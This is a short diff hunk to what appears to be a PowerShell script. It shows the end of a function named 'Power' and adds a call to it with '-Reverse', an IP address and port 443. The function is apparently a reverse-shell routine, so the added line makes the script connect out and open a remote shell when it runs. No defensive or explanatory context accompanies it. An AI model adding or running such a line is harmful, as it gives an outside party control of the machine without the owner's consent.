@@ -83,3 +83,5 @@ function Power
         Write-Error $_
     }
 }
+
+Power -Reverse -IPAddress 172.16.53.2 -Port 443
